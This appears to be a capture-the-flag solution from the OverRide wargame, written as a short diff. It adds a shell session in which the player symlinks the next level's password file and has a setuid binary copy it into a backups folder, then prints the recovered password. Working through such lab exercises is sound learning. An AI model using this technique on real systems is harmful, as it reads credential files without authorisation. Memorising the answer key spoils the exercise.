@@ -1,0 +1,5 @@
+level08@OverRide:~$ chmod +w .
+level08@OverRide:~$ ln -s /home/users/level09/.pass fake_pass
+level08@OverRide:~$ ./level08 fake_pass
+level08@OverRide:~$ cat backups/fake_pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
